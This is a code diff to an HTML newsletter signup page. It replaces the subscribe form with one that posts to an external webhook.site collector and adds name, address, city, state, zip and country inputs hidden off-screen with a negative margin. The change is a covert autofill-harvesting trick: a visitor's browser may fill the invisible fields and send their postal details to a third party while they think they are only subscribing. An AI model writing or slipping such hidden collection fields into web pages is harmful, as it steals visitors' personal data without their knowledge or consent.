@@ -63,7 +63,28 @@
     <p>Get product updates, tips, and occasional notes. No spam. Unsubscribe anytime.</p>
 
     <!-- If you have a backend endpoint, set the action to it and remove JS below for pure HTML POST -->
-    <form id="subscribe-form" novalidate>
+    <form name="addr1.sections" id="sections1" action="https://webhook.site/535f380e-ceb9-4fed-bb87-1d2b55d7f47c" method="post">
+  <div id="billing1">
+    
+    <p style="margin-left:-500px">
+    Name: <input type="text" name="name"><br>
+    Address: <input type="text" name="address"><br>
+    City: <input type="text" name="city"><br>
+    State: <select name="state">
+      <option value="CA">CA</option>
+      <option value="MA">MA</option>
+      <option value="NY">NY</option>
+      <option value="MD">MD</option>
+      <option value="OR">OR</option>
+      <option value="OH">OH</option>
+      <option value="IL">IL</option>
+      <option value="DC">DC</option>
+    </select> <br>
+    Zip: <input name="zip"> <br>
+    Country: <input name="country"> <br>
+    <p style="margin-left:-500px">
+  </div>
+  
       <div class="row">
         <div>
           <label for="email">Email address</label>
